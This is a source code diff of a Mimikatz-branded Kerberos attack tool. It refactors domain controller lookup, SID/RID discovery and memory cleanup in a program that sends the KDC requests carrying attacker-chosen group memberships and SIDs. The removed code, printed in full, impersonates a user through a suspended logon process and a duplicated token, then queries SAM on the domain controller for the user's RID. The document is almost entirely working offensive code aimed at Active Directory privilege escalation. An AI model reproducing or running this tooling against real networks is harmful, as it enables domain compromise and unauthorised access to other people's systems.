@@ -37,12 +37,11 @@ int main(int argc, char * argv[])
 {
 	EncryptionKey userKey;
 	LPCSTR szUser, szDomain, szTarget, szService, szPassword = NULL, szKey = NULL, szSid, szRid, szKdc = NULL, szFilename = NULL, szGroups, szSids, base;
-	PSTR baseSid, tmpSid;
+	PSTR baseSid, tmpSid, szWhatDC = NULL;
 	PSID sid = NULL, domainSid = NULL, pSidTmp;
 	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
 	PKERB_SID_AND_ATTRIBUTES sids = NULL;
-	DWORD ret, rid = 0, i, j, nbGroups, nbSids = 0;
-	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
+	DWORD rid = 0, i, j, nbGroups, nbSids = 0;
 
 	kprintf("\n"
 		"  .#####.   " MIMIKATZ_FULL "\n"
@@ -145,34 +144,24 @@ int main(int argc, char * argv[])
 							if(NT_SUCCESS(kull_m_kerberos_asn1_helper_util_stringToKey(szUser, szDomain, szPassword, szKey, &userKey)))
 							{
 								if(!kull_m_string_args_byName(argc, argv, "kdc", &szKdc, NULL))
-								{
-									ret = DsGetDcName(NULL, szDomain, NULL, NULL, DS_KDC_REQUIRED | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
-									if(ret == ERROR_SUCCESS)
+									if(kull_m_kerberos_helper_net_getDC(szDomain, DS_KDC_REQUIRED, &szWhatDC))
 									{
-										szKdc = cInfo->DomainControllerName + 2;
-										kprintf("[KDC] \'%s\' will be the main server\n", szKdc);
+										kprintf("[KDC] \'%s\' will be the main server\n", szWhatDC);
+										szKdc = szWhatDC;
 									}
-									else PRINT_ERROR("[KDC] DsGetDcName: %u\n", ret);
-								}
 
 								if(szKdc)
 								{
-									if(kull_m_string_args_byName(argc, argv, "sid", &szSid, NULL) && kull_m_string_args_byName(argc, argv, "rid", &szRid, NULL))
-									{
-										if(ConvertStringSidToSid(szSid, &sid))
-											rid = strtoul(szRid, NULL, 0);
-										else PRINT_ERROR_AUTO("ConvertStringSidToSid");
-									}
+									if(kull_m_string_args_byName(argc, argv, "sid", &szSid, NULL))
+										if(!ConvertStringSidToSid(szSid, &sid))
+											PRINT_ERROR_AUTO("ConvertStringSidToSid");
+									if(kull_m_string_args_byName(argc, argv, "rid", &szRid, NULL))
+										rid = strtoul(szRid, NULL, 0);
 
 									if(!(sid && rid))
 									{
 										if(szPassword)
-										{
-#pragma warning(push)
-#pragma warning(disable:4996)
-											impersonateToGetData(szUser, szDomain, szPassword, szKdc,&sid, &rid, _pgmptr);
-#pragma warning(pop)
-										}
+											kull_m_kerberos_helper_util_impersonateToGetData(szUser, szDomain, szPassword, szKdc, sid ? NULL : &sid, rid ? NULL : &rid, NULL, NULL);
 										else PRINT_ERROR("Impersonate is only supported with a password (you need KDC, SID & RID)\n");
 									}
 
@@ -214,16 +203,22 @@ int main(int argc, char * argv[])
 											makeInception(szUser, szDomain, sid, rid, szTarget, szService, &userKey, groups, nbGroups, sids, nbSids, szKdc, 88, szFilename);
 										}
 										else PRINT_ERROR("No KDC at all\n");
-
 										LocalFree(sid);
 									}
 									else PRINT_ERROR("Missing valid SID & RID (argument or auto)\n");
 								}
 								else PRINT_ERROR("Missing one valid DC (argument or auto)\n");
 
-								if(cInfo)
-									NetApiBufferFree(cInfo);
-
+								if(szWhatDC)
+									LocalFree(szWhatDC);
+								if(dynGroups)
+									LocalFree(dynGroups);
+								if(sids && nbSids)
+								{
+									for(i = 0; i < nbSids; i++)
+										LocalFree(sids[i].Sid);
+									LocalFree(sids);
+								}
 								LocalFree(userKey.keyvalue.value);
 							}
 						}
@@ -286,105 +281,5 @@ void makeInception(PCSTR user, PCSTR domain, PSID sid, DWORD rid, PCSTR target, 
 			kull_m_kerberos_asn1_helper_ossFreeBuf(AsReq.value);
 		}
 		kull_m_sock_termSocket(&connectSocket);
-	}
-}
-
-void impersonateToGetData(PCSTR user, PCSTR domain, PCSTR password, PCSTR kdc, PSID *sid, DWORD *rid, PCSTR usingWhat)
-{
-	NTSTATUS status;
-	DWORD ret, *aRid, *usage;
-	ANSI_STRING aUser, aKdc, aDomain, aPass, aProg;
-	UNICODE_STRING uUser, uKdc, uDomain, uPass, uProg;
-	SAMPR_HANDLE hServerHandle, hDomainHandle;
-	PSID domainSid;
-	HANDLE hToken, hNewToken;
-	PROCESS_INFORMATION processInfos;
-	STARTUPINFOW startupInfo;
-	RtlZeroMemory(&startupInfo, sizeof(STARTUPINFOW));
-	startupInfo.cb = sizeof(STARTUPINFOW);
-
-	RtlInitString(&aUser, user);
-	RtlInitString(&aKdc, kdc);
-	RtlInitString(&aDomain, domain);
-	RtlInitString(&aPass, password);
-	RtlInitString(&aProg, usingWhat ? usingWhat : "winver.exe");
-	if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uUser, &aUser, TRUE)))
-	{
-		if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uKdc, &aKdc, TRUE)))
-		{
-			if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uDomain, &aDomain, TRUE)))
-			{
-				if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uPass, &aPass, TRUE)))
-				{
-					if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uProg, &aProg, TRUE)))
-					{
-						if(CreateProcessWithLogonW(uUser.Buffer, uDomain.Buffer, uPass.Buffer, LOGON_NETCREDENTIALS_ONLY, uProg.Buffer, NULL, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfos))
-						{
-							if(OpenProcessToken(processInfos.hProcess, TOKEN_DUPLICATE, &hToken))
-							{
-								if(DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityDelegation, TokenImpersonation, &hNewToken))
-								{
-									if(SetThreadToken(NULL, hNewToken))
-									{
-										kprintf("[AUTH] Impersonation\n");
-										if(!(*sid && *rid))
-										{
-											kprintf("[SID/RID] \'%s @ %s\' must be translated to SID/RID\n", user, domain);
-											status = SamConnect(&uKdc, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
-											if(NT_SUCCESS(status))
-											{
-												status = SamLookupDomainInSamServer(hServerHandle, &uDomain, &domainSid);
-												if(NT_SUCCESS(status))
-												{
-													status = SamOpenDomain(hServerHandle, DOMAIN_LIST_ACCOUNTS | DOMAIN_LOOKUP, domainSid, &hDomainHandle);
-													if(NT_SUCCESS(status))
-													{
-														status = SamLookupNamesInDomain(hDomainHandle, 1, &uUser, &aRid, &usage);
-														if(NT_SUCCESS(status))
-															*rid = *aRid;
-														else PRINT_ERROR("SamLookupNamesInDomain %08x\n", status);
-													}
-													else PRINT_ERROR("SamOpenDomain %08x\n", status);
-
-													ret = GetLengthSid(domainSid);
-													if(*sid = (PSID) LocalAlloc(LPTR, ret))
-													{
-														if(!CopySid(ret, *sid, domainSid))
-														{
-															*sid = (PSID) LocalFree(*sid);
-															PRINT_ERROR_AUTO("CopySid");
-														}
-													}
-													SamFreeMemory(domainSid);
-												}
-												else PRINT_ERROR("SamLookupDomainInSamServer %08x\n", status);
-												SamCloseHandle(hServerHandle);
-											}
-											else PRINT_ERROR("SamConnect %08x\n", status);
-										}
-										RevertToSelf();
-									}
-									else PRINT_ERROR_AUTO("SetThreadToken");
-									CloseHandle(hNewToken);
-								}
-								else PRINT_ERROR_AUTO("DuplicateTokenEx");
-								CloseHandle(hToken);
-							}
-							else PRINT_ERROR_AUTO("OpenProcessToken");
-							TerminateProcess(processInfos.hProcess, 0);
-							CloseHandle(processInfos.hProcess);
-							CloseHandle(processInfos.hThread);
-						}
-						else PRINT_ERROR_AUTO("CreateProcessWithLogonW");
-
-						RtlFreeUnicodeString(&uProg);
-					}
-					RtlFreeUnicodeString(&uPass);
-				}
-				RtlFreeUnicodeString(&uDomain);
-			}
-			RtlFreeUnicodeString(&uKdc);
-		}
-		RtlFreeUnicodeString(&uUser);
 	}
 }
